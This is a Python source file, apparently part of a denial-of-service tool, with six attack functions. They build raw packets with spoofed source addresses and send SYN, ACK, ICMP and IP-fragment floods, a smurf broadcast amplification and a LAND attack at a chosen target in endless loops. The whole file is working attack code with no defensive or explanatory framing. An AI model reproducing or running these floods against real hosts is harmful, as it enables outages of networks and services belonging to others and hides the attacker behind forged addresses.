import socket
import random
import struct
from utils.helpers import checksum

def syn_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        seq = random.randint(0, 0xffffffff)
        # IP header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0   # kernel fills
        ip_id = random.randint(0, 0xffff)
        ip_frag_off = 0
        ip_ttl = random.randint(64, 128)
        ip_proto = socket.IPPROTO_TCP
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(target)
        ip_header = struct.pack('!BBHHHBBH4s4s', (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, 0, ip_saddr, ip_daddr)
        # TCP SYN
        src_port = random.randint(1024, 65535)
        tcp_seq = seq
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags_syn = 2
        tcp_window = random.randint(14600, 65535)
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_header = struct.pack('!HHLLBBHHH', src_port, port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags_syn, tcp_window, 0, tcp_urg_ptr)
        # pseudo header checksum
        psh = struct.pack('!4s4sBBH', ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header))
        psh += tcp_header
        tcp_checksum = checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH', src_port, port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags_syn, tcp_window, tcp_checksum, tcp_urg_ptr)
        packet = ip_header + tcp_header
        try:
            sock.sendto(packet, (target, 0))
        except:
            pass

def ack_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        seq = random.randint(0, 0xffffffff)
        ack = random.randint(0, 0xffffffff)
        ip_header = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, random.randint(64,128), socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(target))
        tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, seq, ack, (5<<4), 16, random.randint(14600,65535), 0, 0)
        psh = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(target), 0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
        tcp_checksum = checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, seq, ack, (5<<4), 16, random.randint(14600,65535), tcp_checksum, 0)
        sock.sendto(ip_header + tcp_header, (target, 0))

def icmp_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while not stop_event.is_set():
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        ip_header = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_ICMP, 0, socket.inet_aton(src_ip), socket.inet_aton(target))
        icmp_type = 8   # echo request
        code = 0
        icmp_seq = random.randint(0, 0xffff)
        icmp_id = random.randint(0, 0xffff)
        payload = bytes(random.randint(0,255) for _ in range(64))
        icmp_header = struct.pack('!BBHHH', icmp_type, code, 0, icmp_id, icmp_seq) + payload
        icmp_cksum = checksum(icmp_header)
        icmp_header = struct.pack('!BBHHH', icmp_type, code, icmp_cksum, icmp_id, icmp_seq) + payload
        sock.sendto(ip_header + icmp_header, (target, 0))

def ip_frag_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    while not stop_event.is_set():
        src = ".".join(str(random.randint(1,254)) for _ in range(4))
        ip_header = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0x2000, random.randint(64,128), random.choice([socket.IPPROTO_TCP, socket.IPPROTO_UDP, socket.IPPROTO_ICMP]), 0, socket.inet_aton(src), socket.inet_aton(target))
        payload = bytes(random.randint(0,255) for _ in range(24))
        sock.sendto(ip_header + payload, (target, 0))

def smurf_flood(target, port, stop_event):
    # Sends ICMP to broadcast with spoofed source = target
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    broadcast = ".".join(target.split('.')[:-1] + ["255"])  # rudimentary
    while not stop_event.is_set():
        ip_header = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_ICMP, 0, socket.inet_aton(target), socket.inet_aton(broadcast))
        icmp_type = 8
        icmp_seq = random.randint(0,65535)
        icmp_id = random.randint(0,65535)
        icmp_header = struct.pack('!BBHHH', icmp_type, 0, 0, icmp_id, icmp_seq)
        icmp_cksum = checksum(icmp_header)
        icmp_header = struct.pack('!BBHHH', icmp_type, 0, icmp_cksum, icmp_id, icmp_seq)
        sock.sendto(ip_header + icmp_header, (broadcast, 0))

def land_attack(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        ip_header = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(target), socket.inet_aton(target))
        tcp_header = struct.pack('!HHLLBBHHH', port, port, random.randint(0,0xffffffff), 0, (5<<4), 2, random.randint(14600,65535), 0, 0)
        psh = struct.pack('!4s4sBBH', socket.inet_aton(target), socket.inet_aton(target), 0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
        cksum = checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH', port, port, random.randint(0,0xffffffff), 0, (5<<4), 2, random.randint(14600,65535), cksum, 0)
        sock.sendto(ip_header + tcp_header, (target, 0))